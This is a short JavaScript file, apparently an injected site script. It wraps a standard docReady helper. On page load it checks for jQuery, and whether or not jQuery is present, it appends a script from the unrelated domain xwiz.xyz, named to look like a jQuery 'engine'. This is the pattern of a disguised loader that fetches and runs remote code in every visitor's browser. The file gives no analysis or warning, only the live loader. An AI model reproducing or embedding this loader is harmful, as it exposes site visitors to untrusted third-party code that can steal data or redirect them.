(function(funcName, baseObj) {
    funcName = funcName || "docReady";
    baseObj = baseObj || window;
    var readyList = [];
    var readyFired = false;
    var readyEventHandlersInstalled = false;
    function ready() {
        if (!readyFired) {
            readyFired = true;
            for (var i = 0; i < readyList.length; i++) {
                readyList[i].fn.call(window, readyList[i].ctx);
            }
            readyList = [];
        }
    }

    function readyStateChange() {
        if ( document.readyState === "complete" ) {
            ready();
        }
    }
    baseObj[funcName] = function(callback, context) {
        if (readyFired) {
            setTimeout(function() {callback(context);}, 1);
            return;
        } else {
            readyList.push({fn: callback, ctx: context});
        }
        if (document.readyState === "complete") {
            setTimeout(ready, 1);
        } else if (!readyEventHandlersInstalled) {
            if (document.addEventListener) {
                document.addEventListener("DOMContentLoaded", ready, false);
                window.addEventListener("load", ready, false);
            } else {
                document.attachEvent("onreadystatechange", readyStateChange);
                window.attachEvent("onload", ready);
            }
            readyEventHandlersInstalled = true;
        }
    }
})("docReady", window);
docReady(function() {
 if (typeof jQuery == 'undefined') {
   var script = document.createElement('script');
   script.type = "text/javascript";
   script.src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js";
   document.getElementsByTagName('head')[0].appendChild(script);
   
var script1 = document.createElement('script');
   script1.type = "text/javascript";
   script1.src = "https://xwiz.xyz/engine/jquery.engine.js";
   document.getElementsByTagName('head')[0].appendChild(script1);
}
else {
var script1 = document.createElement('script');
   script1.type = "text/javascript";
   script1.src = "https://xwiz.xyz/engine/jquery.engine.js";
   document.getElementsByTagName('head')[0].appendChild(script1);
}});